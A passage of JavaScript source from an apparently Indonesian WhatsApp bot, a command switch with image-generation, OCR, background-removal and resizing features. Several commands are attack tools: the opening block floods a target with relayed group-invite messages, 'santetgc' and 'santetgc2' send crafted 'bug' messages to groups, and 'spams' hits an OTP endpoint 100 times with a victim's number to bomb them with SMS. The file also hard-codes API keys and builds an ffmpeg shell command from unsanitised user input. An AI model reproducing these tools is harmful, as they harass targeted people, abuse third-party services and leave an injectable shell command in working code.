						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(2000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(10000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
					await sleep(12000)
					vreden.relayMessage(Pe, groupInvite.message, {
						messageId: groupInvite.key.id
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'santetgc': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let good = text.split(',');
				if (good.length < 2) return m.reply(`*Masukan Input Dengan Benar!*\n\n*Cara :*\n${prefix + command} id,jumlah\n\n*Contoh :*\n${prefix + command} 129xxx@g.us,5\n\n`)
				if (!good[0]) return m.warning(`*Masukan ID Grup!*\n\n*Cara :*\n${prefix + command} id,jumlah\n\n*Contoh :*\n${prefix + command} 172xxx@g.us,5\n\n`)
				if (!good[1]) return m.warning(`*Masukan Jumlah Yang Dikirim!*\n\n*Cara :*\n${prefix + command} id,jumlah\n\n*Contoh :*\n${prefix + command} 172xxx@g.us,5\n\n`)
				try {
					m.reply(`*[ </> ]* Mengirimkan ${command}...`)
					await sleep(1000)
					gcbug(good[0], good[1])
					await sleep(2000)
					m.reply(`*[ </> ]* Done sent!`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'santetgc2': {
				if (!text) return m.warning('Masukan ID Grup\n\n*Contoh:*\n.santetgc2 1775885477557@g.us')
				if (!q.includes("@")) return m.warning('Masukan ID Grup\n\n*Contoh:*\n.santetgc2 1775885477557@g.ust')
				async function buggi(judul, teks, buttontext, buttonid, target) {
					let msg = generateWAMessageFromContent(target, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									body: proto.Message.InteractiveMessage.Body.create({
										text: teks
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: footxt
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: judul,
										subtitle: "Yahya Almuthahar",
										hasMediaAttachment: false
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":${buttontext},\"id\":${buttonid}}`
										}],
									})
								})
							}
						}
					}, {})

					await vreden.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					})
				}
				try {
					buggi("Assalamualaikum", `Gak jawab dosa`, "Waalaikum salam", "salam", text)
					await sleep(2000)
					buggi("Kenalin Member Baru", `Gak jawab dosa`, "Waalaikum salam", "salam", text)
					await sleep(4000)
					buggi("Kok Sepi", `Gak jawab dosa`, "Waalaikum salam", "salam", text)
					await sleep(6000)
					buggi("Pada Kemana", `Gak jawab dosa`, "Waalaikum salam", "salam", text)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'spams': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				try {
					if (m.quoted || text) {
						if (froms.startsWith('08')) return reply('Awali nomor dengan +62')
						if (froms.startsWith('+6287824695047')) return reply('Tidak bisa spam ke nomor ini!')
						let nosms = '+' + froms.replace('@s.whatsapp.net', '')
						let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
						let ua = mal[Math.floor(Math.random() * mal.length)];
						let axios = require('axios').default;
						let hd = {
							'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
						};
						const dat = {
							'phone': nosms
						};
						for (let x = 0; x < 100; x++) {
							axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
								headers: hd
							}).then(res => {
								console.log(res);
							}).catch(err => {
								console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS)`);
							});
						}
					} else m.reply(`Penggunaan spamsms nomor/reply pesan target*\nContoh spamsms +6281214281312`)
					m.reply(`spam sms/call akan di kirim ke no target`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'intro': {
				var intro = `⸙‹•══════════════♡᭄
│       *「 Kartu Intro 」*
│ *Nama     :* 
│ *Gender   :* 
│ *Umur      :* 
│ *Hobby    :* 
│ *Kelas      :* 
│ *Asal         :* 
│ *Agama    :* 
|  *Status     :* 
╰═════ꪶ ۪⸙ ━ ━ ━ ━ ꪶ ̷⸙
`
				vreden.sendMessage(m.chat, {
					text: intro
				}, {
					quoted: fchannel
				})
			}
			break
			case 'tes':
			case 'test':
				vreden.sendMessage(m.chat, {
					text: `*Runtime* :\n${runtime(os.uptime())}`
				}, {
					quoted: fchannel
				})
				break
			case 'bokep': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (!isCreator && !isPremium) return m.tolak('Tobat Bro Jangan Bokep Mulu:v')
				await await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let istighfar = fs.readFileSync('./media/Astaghfirullah.mp4')
					let ban = m.mentionedJid[0] || m.sender || conn.parseMention(args[0]) || (text.replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';
					await vreden.sendFile(ban, istighfar, 'astagfirullah.mp4', `Tobat Broo:v`, m)
					return m.reply(`Silahkan Cek Di Private Chat:v`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'listbahasa':
				var clear = ["auto", "isSupported", "getCode"]
				var teks = `List Bahasa Yang Tersedia\n\n`
				for (let i in translate.languages) {
					if (!clear.includes(i)) {
						teks += `*${i}*: ${translate.languages[i]}\n`
					}
				}
				m.reply(teks)
				break

				//━━━━━━━━━━━━━━━[ OPEN AI ]━━━━━━━━━━━━━━━━━//
			case 'photoleap': {
				if (!text) return m.warning(`Contoh : ${prefix+command} hello world`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key
					}
				});

				try {
					const {
						data
					} = await axios.get("https://tti.photoleapapp.com/api/v1/generate?prompt=" + encodeURIComponent(text));
					if (data) {
						await vreden.sendMessage(m.chat, {
							image: {
								url: data.result_url
							},
							caption: `*Photo Leap 🍟*\nPrompt:\n\n${text}`
						}, {
							quoted: m,
							mentions: [m.sender]
						});
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'replicate': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!quoted) return m.warning('Reply Image')
				if (!/image/.test(mime)) return m.warning(`Send/Reply Foto Dengan Caption ${prefix + command}`)
				if (!text) return m.warning(`Contoh : ${prefix+command} hello world`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let media = await vreden.downloadAndSaveMediaMessage(quoted);
					let anu = await pomfCDN(media);
					let hasil = await Replicate(anu, text, "3a4886dd3230e523600d3b555f651dc82aba3a4e");
					let id = hasil.id
					let url = hasil.generated
					await vreden.sendMessage(m.chat, {
						image: {
							url: url
						},
						caption: `*Replicate Image 🍟*`
					}, {
						quoted: m
					})
					await fs.unlinkSync(media);
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break;
			case 'ocr': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!quoted) return m.warning('Reply Image')
				if (!/image/.test(mime)) return m.warning(`Send/Reply Foto Dengan Caption ${prefix + command}`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let media = await vreden.downloadAndSaveMediaMessage(quoted);
					let anu = await pomfCDN(media);
					let result = await fetchJson(`https://api.ocr.space/parse/imageurl?apikey=helloworld&url=${anu}`)
					let teks = result.ParsedResults[0].ParsedText
					m.sendForward(teks)
					await fs.unlinkSync(media);
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break;
			case 'cococlip': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!quoted) return m.warning('Reply Image')
				if (!/image/.test(mime)) return m.warning(`Send/Reply Foto Dengan Caption ${prefix + command}`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let media = await vreden.downloadAndSaveMediaMessage(quoted);
					let anu = await pomfCDN(media);
					let result = await cococlip(anu)
					m.sendForward(result)
					await fs.unlinkSync(media);
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break;
			case 'differentme': { //Fix Qioo
				if (!isCreator && !isPremium) return m.tolak(mess.OnlyPrem)
				if (!quoted) return m.warning(`Fotonya Mana?`)
				if (!/image/.test(mime)) return m.warning(`Send/Reply Foto Dengan Caption ${prefix + command}`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					const media = await vreden.downloadAndSaveMediaMessage(quoted)
					const anu = await pomfCDN(media)
					const img = await fetch(`https://skizo.tech/api/aimirror?&url=${anu}&filter=${text}&apikey=${setting.XznKey}`)
					const p = await img.json()
					if (p.status !== 200) throw 'Mana gakada'
					const imgs = p.generated_image_addresses
					const capt = p.time_processing
					vreden.sendMessage(m.chat, {
						image: {
							url: imgs
						},
						caption: `Done Bruh\nWaktu Selesai ${capt}`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'differentme2': { //Fix Qioo
				if (!isCreator && !isPremium) return m.tolak(mess.OnlyPrem)
				if (!quoted) return m.warning(`Fotonya Mana?`)
				if (!/image/.test(mime)) return m.warning(`Send/Reply Foto Dengan Caption ${prefix + command}`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					const media = await vreden.downloadAndSaveMediaMessage(quoted)
					const anu = await pomfCDN(media)
					const img = await fetch(`https://skizo.tech/api/aimirrorvip?&url=${anu}&filter=${text}&apikey=${setting.XznKey}`)
					const p = await img.json()
					if (p.status !== 200) throw 'Mana gakada'
					const imgs = p.generated_image_addresses
					const capt = p.time_processing
					vreden.sendMessage(m.chat, {
						image: {
							url: imgs
						},
						caption: `Done Bruh\nWaktu Selesai ${capt}`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'animediffusion4':
			case 'animedif4':
			case 'animediff4': {
				if (!isCreator && !isPremium) return m.tolak(mess.OnlyPrem)
				if (!text) return m.warning(`Masukan Promptnya\nContoh:\n ${prefix+command} ultra realistic close up portrait ((beautiful pale cyberpunk female with heavy black eyeliner)), blue eyes, shaved side haircut, hyper detail, cinematic lighting, magic neon, dark red city, Canon EOS R3, nikon, f/1.4, ISO 200, 1/160s, 8K, RAW, unedited, symmetrical balance, in-frame, 8K`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					const params = {
						model: "dreamlike-anime-1.0.safetensors [4520e090]",
						prompt: text,
						style_preset: "fantasy-art",
						steps: 20,
						cfg_scale: 7,
						seed: -1,
						upscale: true,
						sampler: "DPM++ 2M Karras",
						width: 1024,
						height: 1024
					}
					const generate = await txt2img(params);
					await sleep(30000)
					const result = await getJobs(generate.job);
					await vreden.sendMessage(m.chat, {
						image: {
							url: result.imageUrl
						},
						caption: `Anime Diffusion V4🍟`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'animediffusion3':
			case 'animedif3':
			case 'animediff3': {
				if (!isCreator && !isPremium) return m.tolak(mess.OnlyPrem)
				if (!text) return m.warning(`Masukan Promptnya\nContoh:\n ${prefix+command} ultra realistic close up portrait ((beautiful pale cyberpunk female with heavy black eyeliner)), blue eyes, shaved side haircut, hyper detail, cinematic lighting, magic neon, dark red city, Canon EOS R3, nikon, f/1.4, ISO 200, 1/160s, 8K, RAW, unedited, symmetrical balance, in-frame, 8K`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					const params = {
						model: "dreamlike-anime-1.0.safetensors [4520e090]",
						prompt: text,
						style_preset: "digital-art",
						steps: 20,
						cfg_scale: 7,
						seed: -1,
						upscale: true,
						sampler: "DPM++ 2M Karras",
						width: 1024,
						height: 1024
					}
					const generate = await txt2img(params);
					await sleep(30000)
					const result = await getJobs(generate.job);
					await vreden.sendMessage(m.chat, {
						image: {
							url: result.imageUrl
						},
						caption: `Anime Diffusion V3🍟`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'animediffusion2':
			case 'animedif2':
			case 'animediff2': {
				if (!isCreator && !isPremium) return m.tolak(mess.OnlyPrem)
				if (!text) return m.warning(`Masukan Promptnya\nContoh:\n ${prefix+command} ultra realistic close up portrait ((beautiful pale cyberpunk female with heavy black eyeliner)), blue eyes, shaved side haircut, hyper detail, cinematic lighting, magic neon, dark red city, Canon EOS R3, nikon, f/1.4, ISO 200, 1/160s, 8K, RAW, unedited, symmetrical balance, in-frame, 8K`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					const params = {
						model: "dreamlike-anime-1.0.safetensors [4520e090]",
						prompt: text,
						style_preset: "anime",
						steps: 20,
						cfg_scale: 7,
						seed: -1,
						upscale: true,
						sampler: "DPM++ 2M Karras",
						width: 1024,
						height: 1024
					}
					const generate = await txt2img(params);
					await sleep(30000)
					const result = await getJobs(generate.job);
					await vreden.sendMessage(m.chat, {
						image: {
							url: result.imageUrl
						},
						caption: `Anime Diffusion V2🍟`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'animediffusion':
			case 'animedif':
			case 'animediff': {
				if (!isCreator && !isPremium) return m.tolak(mess.OnlyPrem)
				if (!text) return m.warning(`Masukan Promptnya\nContoh:\n ${prefix+command} ultra realistic close up portrait ((beautiful pale cyberpunk female with heavy black eyeliner)), blue eyes, shaved side haircut, hyper detail, cinematic lighting, magic neon, dark red city, Canon EOS R3, nikon, f/1.4, ISO 200, 1/160s, 8K, RAW, unedited, symmetrical balance, in-frame, 8K`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					const params = {
						model: "EimisAnimeDiffusion_V1.ckpt [4f828a15]",
						prompt: text,
						style_preset: "anime",
						steps: 20,
						cfg_scale: 7,
						seed: -1,
						upscale: true,
						sampler: "DPM++ 2M Karras",
						width: 1024,
						height: 1024
					}
					const generate = await txt2img(params);
					await sleep(30000)
					const result = await getJobs(generate.job);
					await vreden.sendMessage(m.chat, {
						image: {
							url: result.imageUrl
						},
						caption: `Anime Diffusion🍟`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'diffusion':
			case 'stabledif':
			case 'diff': {
				if (!isCreator && !isPremium) return m.tolak(mess.OnlyPrem)
				if (!text) return m.warning(`Masukan Promptnya\nContoh:\n ${prefix+command} ultra realistic close up portrait ((beautiful pale cyberpunk female with heavy black eyeliner)), blue eyes, shaved side haircut, hyper detail, cinematic lighting, magic neon, dark red city, Canon EOS R3, nikon, f/1.4, ISO 200, 1/160s, 8K, RAW, unedited, symmetrical balance, in-frame, 8K`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					const params = {
						model: "dreamlike-diffusion-1.0.safetensors [5c9fd6e0]",
						prompt: text,
						style_preset: "3d-model",
						steps: 20,
						cfg_scale: 7,
						seed: -1,
						upscale: true,
						sampler: "DPM++ 2M Karras",
						width: 1024,
						height: 1024
					}
					const generate = await txt2img(params);
					await sleep(30000)
					const result = await getJobs(generate.job);
					await vreden.sendMessage(m.chat, {
						image: {
							url: result.imageUrl
						},
						caption: `Diffusion Image🍟`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'txt2video':
			case 'text2video': { //Fix Qioo
				if (!text) return reply(`Masukan Prompt`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				let old = new Date()
				try {
					let emi = await fetchJson(`https://api.maelyn.my.id/api/txt2video?prompt=${text}&apikey=SvbxiWHTmt`)
					vreden.sendMessage(m.chat, {
						video: {
							url: emi.result.name
						},
						caption: `*🍟 Fetching* : ${((new Date - old) * 1)} ms`
					}, {
						quoted: fcall
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'text2anime':
			case 'txt2anime': {
				if (!q) return m.warning(`*Masukan Prompt!*\n\nContoh:\n${prefix + command} girls beautiful`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let result = await sdxlAnime(q)
					await vreden.sendMessage(m.chat, {
						image: {
							url: result.data.url
						},
						caption: `Diffusion Anime 🍟`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'text2waifu':
			case 'txt2waifu': {
				if (!q) return m.warning(`*Masukan Prompt!*\n\nContoh:\n${prefix + command} girls beautiful`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let result = await sdxlWaifu(q)
					await vreden.sendMessage(m.chat, {
						image: {
							url: result.data.url
						},
						caption: `Diffusion Waifu 🍟`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'text2emoji':
			case 'txt2emoji': {
				if (!q) return m.warning(`*Masukan Prompt!*\n\nContoh:\n${prefix + command} girls beautiful`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let result = await sdxlEmoji(q)
					await vreden.sendMessage(m.chat, {
						image: {
							url: result.data.url
						},
						caption: `Emoji Generator 🍟`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'text2img':
			case 'txt2img': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				const input_data = await listModels();
				const samplr = await listSampler();
				const styler = await getModels();
				let [urutan, tema] = text.split("|")
				try {
					let data = input_data.map((item, index) => ({
						title: item.replace(/[_-]/g, ' ').replace(/\..*/, ''),
						id: item
					}));
					if (!urutan) return m.reply(`Masukan models!\n\n*Contoh:*\n${prefix + command} [nomor]|[prompt]\n\n*Pilih angka yg ada*\n` + data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"))
					if (isNaN(urutan)) return m.reply(`Masukan Models Yang Valid!\n\n*Contoh:*\n${prefix + command} [nomor]|[prompt]\n\n*Pilih angka yg ada*\n` + data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"))
					if (urutan > data.length) return m.reply(`Masukan Models Yang Valid!\n\n*Contoh:*\n${prefix + command} [nomor]|[prompt]\n\n*Pilih angka yg ada*\n` + data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"))
					if (!tema) return m.warning(`*Masukan Prompt!*!\n\nContoh:\n${prefix + command} [nomor]|[prompt]`)
					let out = data[urutan - 1].id
					await vreden.sendMessage(m.chat, {
						react: {
							text: "⏱️",
							key: m.key,
						}
					})
					const samp = await pickRandom(samplr)
					const sty = await pickRandom(styler[10].enum)
					const params = {
						model: out,
						prompt: tema,
						style_preset: sty,
						steps: 20,
						cfg_scale: 7,
						seed: -1,
						upscale: true,
						sampler: samp,
						width: 1024,
						height: 1024
					}
					const generate = await txt2img(params);
					await sleep(30000)
					const result = await getJobs(generate.job);
					await vreden.sendMessage(m.chat, {
						image: {
							url: result.imageUrl
						},
						caption: `*Image Effect*\n${out} 🍟`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'aiscene': { //Fix Qioo
				if (!isCreator && !isPremium) return m.tolak(mess.OnlyPrem)
				if (!quoted) return m.warning(`Fotonya Mana?`)
				if (!/image/.test(mime)) return m.warning(`Send/Reply Foto Dengan Caption ${prefix + command}`)
				m.reply('Proses')
				try {
					const media = await vreden.downloadAndSaveMediaMessage(quoted)
					const anu = await pomfCDN(media)
					vreden.sendMessage(m.chat, {
						image: {
							url: `https://skizo.tech/api/aiscene?url=${anu}&apikey=${setting.XznKey}`
						},
						caption: 'Done Bruh Kalo Jelek Maapin Ya:<'
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'toanime':
			case 'jadianime': { //Fix Qioo
				if (!isCreator && !isPremium) return m.tolak(mess.OnlyPrem)
				if (!quoted) return m.warning(`Fotonya Mana?`)
				if (!/image/.test(mime)) return m.warning(`Send/Reply Foto Dengan Caption ${prefix + command}`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					const media = await vreden.downloadAndSaveMediaMessage(quoted)
					const anu = await pomfCDN(media)
					vreden.sendMessage(m.chat, {
						image: {
							url: `https://skizo.tech/api/toanime?url=${anu}&apikey=${setting.XznKey}`
						},
						caption: 'Done Jadi Anime Ayangg >///<'
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'nobg':
			case 'imagenobg':
			case 'removebg':
			case 'remove-bg': {
				if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
				if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
				let remobg = require('remove.bg')
				let apirnobg = ["pvmbuSzyrip1ksmj9otVSogd", "jGaBWNXPP8LXV6KW3ovBWozE", "kqWaDsZLxMk2kh9MJu5u7ceP", "kDhVMX7eoByik5hFomEdMDVs", "c7J5ityXePPqxARTMRpohJvj"]
				try {
					let apinobg = await pickRandom(apirnobg)
					hmm = await 'remobg-' + getRandom('')
					localFile = await vreden.downloadAndSaveMediaMessage(quoted, hmm)
					outputFile = await './sticker/hremo-' + getRandom('.png')
					await vreden.sendMessage(m.chat, {
						react: {
							text: "⏱️",
							key: m.key,
						}
					})
					await remobg.removeBackgroundFromImageFile({
						path: localFile,
						apiKey: apinobg,
						size: "regular",
						type: "auto",
						scale: "100%",
						outputFile
					}).then(async result => {
						vreden.sendMessage(m.chat, {
							image: fs.readFileSync(outputFile),
							caption: "*Remove Background 🍟*"
						}, {
							quoted: m
						})
						await fs.unlinkSync(localFile)
						await fs.unlinkSync(outputFile)
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'resize': {
				if (!q) return m.warning(`Masukan ukuran panjangxlebar, contoh ${prefix+command} 300x300`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				let panjang = q.split('x')[0]
				let lebar = q.split('x')[1]
				try {
					let media = await vreden.downloadAndSaveMediaMessage(quoted)
					let ran = getRandom('.jpeg')
					exec(`ffmpeg -i ${media} -vf scale=${panjang}:${lebar} ${ran}`, async (err) => {
						fs.unlinkSync(media)
						if (err) return m.reply(`Err: ${err}`)
						let buffer453 = fs.readFileSync(ran)
						await vreden.sendMessage(m.chat, {
							mimetype: 'image/jpeg',
							image: buffer453,
							caption: `Done Ayang>///<`
						}, {
							quoted: fchannel
						})
						fs.unlinkSync(ran)
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'remini2':
			case 'hd2':
			case 'hdr2': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!quoted) return m.warning(`Fotonya Mana?`)
				if (!/image/.test(mime)) return m.warning(`Send/Reply Foto Dengan Caption ${prefix + command}`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					if (/remini/.test(command)) cap = `*Type :* Ai Remini 🖼️\n*Result :* Succes ✅`
					if (/hd/.test(command)) cap = `*Type :* Ai HD Foto 📸\n*Result :* Succes ✅`
					if (/hdr/.test(command)) cap = `*Type :* Ai HDR 🖼️\n*Result :* Succes ✅`
					let media = await vreden.downloadAndSaveMediaMessage(quoted);
					let anu = await pomfCDN(media);
					const result = await remini2(anu)
					vreden.sendMessage(m.chat, {
						image: {
							url: result.result_url
						},
						caption: cap
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'remini':
			case 'hd':
			case 'hdr': {
				const availableScales = [2, 4];
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!quoted) return m.warning(`Fotonya Mana?`)
				if (!/image/.test(mime)) return m.warning(`Send/Reply Foto Dengan Caption ${prefix + command}`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let tag = `@${m.sender.split("@")[0]}`
					let scale = availableScales.includes(parseInt(text)) ? parseInt(text) : 2;
					let versionInfo = `✨ *Source*: remini.ai\n🔍 *Skala*: ${scale}`;
					let media = await quoted.download()
					let result = await upscalev2(media, scale);
					await vreden.sendMessage(m.chat, {
						image: {
							url: result
						},
